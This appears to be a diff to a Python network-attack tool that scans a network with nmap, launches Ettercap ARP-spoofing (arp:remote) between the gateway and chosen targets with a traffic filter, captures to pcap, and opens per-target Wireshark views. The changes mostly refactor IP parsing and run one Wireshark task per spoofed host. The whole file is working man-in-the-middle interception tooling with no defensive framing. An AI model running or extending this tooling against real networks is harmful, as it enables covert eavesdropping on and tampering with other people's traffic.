@@ -26,7 +26,6 @@ import socket
 from common_url import main as cu
 import base64
 
-
 def from_base64(encoded_string):
     decoded_bytes = base64.b64decode(encoded_string.encode('utf-8'))
     return decoded_bytes.decode('utf-8')
@@ -325,10 +324,6 @@ async def run_ettercap(interface, default_gateway, target_ips, filter_file, url_
             if len(target_ips) > 1:
                 print('If you pass in more than 1 host, make sure to press Ctrl + C to see the results for other hosts.')
 
-            # Open Wireshark in a new GNOME terminal window with filter applied for the current target IP
-            gnome_wireshark_command = f'gnome-terminal -- bash -c "wireshark -i {interface} -k -Y \\"ip.addr=={target_ip}\\"; exec bash"'
-            os.system(gnome_wireshark_command)  # Launch Wireshark in GNOME terminal
-
             # Running Ettercap in a new GNOME terminal window
             gnome_ettercap_command = f'gnome-terminal -- bash -c "ettercap -T -S -i {interface} -F {compiled_file} -M arp:remote //{default_gateway}/ //{target_ip}/ -w {pcap_file}; exec bash"'
             os.system(gnome_ettercap_command)  # Launch Ettercap in GNOME terminal
@@ -543,27 +538,26 @@ def handle_sigterm(signum, frame):
     exit(0)
 
 
-
 async def run_wireshark(interface, target_ips, urls, exclude_ips):
-    # Ensure target_ips is a list
+    # Ensure target_ips is a list of strings
     if isinstance(target_ips, str):
-        target_ips = [target_ips]
+        target_ips = target_ips.split(',')
+    elif not isinstance(target_ips, list):
+        target_ips = [str(target_ips)]  # Convert to string if not already
 
-      # Ensure exclude_ips is a list, handling different input data types
+    # Ensure exclude_ips is a list of strings
     if isinstance(exclude_ips, str):
-        exclude_ips = [exclude_ips]
+        exclude_ips = exclude_ips.split(',')
     elif not isinstance(exclude_ips, list):
-        for ip in exclude_ips:
-            target_ips = [ip]
+        exclude_ips = [str(exclude_ips)]  # Convert to string if not already
 
-    
     # Normalize URLs by stripping protocol and handling variations in domain/subdomain
     with open(urls, 'r') as url_file:
         normalized_urls = [url.strip().split("//")[-1].replace("www.", "") for url in url_file]
 
     # Create exclusion filter for IPs
     exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])
-    
+
     # Create IP filter for target IPs
     target_ip_filter = " || ".join([f"(ip.src == {ip} || ip.dst == {ip})" for ip in target_ips])
 
@@ -579,6 +573,7 @@ async def run_wireshark(interface, target_ips, urls, exclude_ips):
     if url_filters:
         filter_parts.append(f"({url_filters})")
 
+    # Final filter string
     filter_str = " && ".join(filter_parts) if filter_parts else "ip"
 
     # Command to run Wireshark with the filter
@@ -596,19 +591,14 @@ async def run_wireshark(interface, target_ips, urls, exclude_ips):
         stdout, stderr = await process.communicate()
         if process.returncode != 0:
             print(Fore.RED + f"Wireshark encountered an error: {stderr.decode().strip()}")
-            await menu()
         else:
             print(Fore.GREEN + "Wireshark completed.")
-           
-            
-            
     except asyncio.CancelledError:
         # Handle task cancellation (if applicable)
         print(Fore.YELLOW + "Wireshark task was cancelled.")
     except Exception as e:
         # Catch other errors and print them
         print(Fore.RED + f"An error occurred while running Wireshark: {e}")
-
 
 
 # Simple in-memory cache
@@ -792,6 +782,16 @@ def sanitize_filename(filename):
         filename = filename.replace(char, '_')
     return filename
 
+
+
+# Function to handle comma-separated IPs
+def process_comma_separated_ips(ip_string):
+    if isinstance(ip_string, str):
+        ip_list = ip_string.split(',')
+        ip_list = [ip.strip() for ip in ip_list]  # Remove any extra spaces
+        return ip_list
+    return []
+
 async def filter_and_analyze_pcap(user_data):
     # Set up signal handler for termination
     loop = asyncio.get_event_loop()
@@ -803,6 +803,10 @@ async def filter_and_analyze_pcap(user_data):
     filter_file = user_data['filter_file']
     exclude_ips = user_data['exclude_ips']
     target_ips = user_data['target_ips']
+
+    # If the user passed comma-separated IPs as a string, process them
+    if isinstance(target_ips, str):
+        target_ips = process_comma_separated_ips(target_ips)
 
     try:
         # Assume this function gets network information (gateway and IP address)
@@ -818,8 +822,6 @@ async def filter_and_analyze_pcap(user_data):
     try:
         # Run nmap scan to identify active devices in the target network
         await run_nmap_scan(str(target_network))  # Pass the network string for Nmap
-       
-        
     except Exception as e:
         print(Fore.RED + f"Error running Nmap scan: {e}")
         return
@@ -886,30 +888,70 @@ async def filter_and_analyze_pcap(user_data):
 
     # Initialize tasks as None to ensure they are defined even if exceptions are raised
     ettercap_task = None
-    wireshark_task = None
+    wireshark_tasks = []  # Will hold tasks for each target IP
 
     # Run Ettercap and Wireshark in parallel for each target IP
     try:
         ettercap_task = asyncio.create_task(run_ettercap(interface, default_gateway, target_ips, filter_file, url_file_path))
-        wireshark_task = asyncio.create_task(run_wireshark(
-            interface=interface,
-            target_ips=target_ips,
-            urls=url_file_path,
-            exclude_ips=exclude_ips
-        ))
+        
+        # For each target IP, create a separate task for Wireshark
+        for ip in target_ips:
+            wireshark_task = asyncio.create_task(run_wireshark(
+                interface=interface,
+                target_ips=[ip],  # Pass only one IP at a time
+                urls=url_file_path,
+                exclude_ips=exclude_ips
+            ))
+            wireshark_tasks.append((ip, wireshark_task))
 
-        # Wait for both Ettercap and Wireshark to finish
-        await asyncio.gather(ettercap_task, wireshark_task)
+        # Ask the user which IP to view first from the multiple tasks
+        print("\nMultiple Wireshark instances are running.")
+        print("Select which target IP to view first:\n")
+        for idx, (ip, _) in enumerate(wireshark_tasks, 1):
+            print(f"{idx}. {ip}")
+
+        selected_ip = None
+        while selected_ip is None:
+            try:
+                choice = input("\nEnter the number of the IP to view first: ").strip()
+                if choice.isdigit():
+                    choice = int(choice)
+                    if 1 <= choice <= len(wireshark_tasks):
+                        selected_ip = wireshark_tasks[choice - 1][0]
+                        break
+                    else:
+                        print(Fore.RED + "Invalid choice. Please enter a valid number.")
+                else:
+                    print(Fore.RED + "Invalid input. Please enter a number.")
+            except Exception as e:
+                print(Fore.RED + f"Error selecting IP: {e}")
+
+        print(Fore.GREEN + f"\nDisplaying Wireshark for {selected_ip} first...")
+
+        # Wait for the selected Wireshark instance first
+        selected_task = [t for ip, t in wireshark_tasks if ip == selected_ip][0]
+        await selected_task
+
+        # Then wait for all other instances to finish
+        for ip, task in wireshark_tasks:
+            if ip != selected_ip:
+                await task
+
+        # Wait for Ettercap to finish
+        await ettercap_task
 
     except Exception as e:
         print(Fore.RED + f"An error occurred while running Ettercap and Wireshark: {e}")
         # Cancel tasks if any exception occurs
         if ettercap_task and not ettercap_task.done():
             ettercap_task.cancel()
-        if wireshark_task and not wireshark_task.done():
-            wireshark_task.cancel()
+        if wireshark_tasks and any(not task.done() for _, task in wireshark_tasks):
+            for _, task in wireshark_tasks:
+                if not task.done():
+                    task.cancel()
+
         await asyncio.gather(
-            *(task for task in [ettercap_task, wireshark_task] if task and not task.done()),
+            *(task for task in [ettercap_task] + [t for _, t in wireshark_tasks] if task and not task.done()),
             return_exceptions=True
         )
 
@@ -926,6 +968,10 @@ async def filter_and_analyze_pcap(user_data):
         print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")
 
     print(Fore.GREEN + "Both filtering and Wireshark analysis completed.")
+
+
+
+
 async def resolve_and_display_ips():
 
     target_ips = input('Enter the target_ip that you spoofed from the first step: ').split()
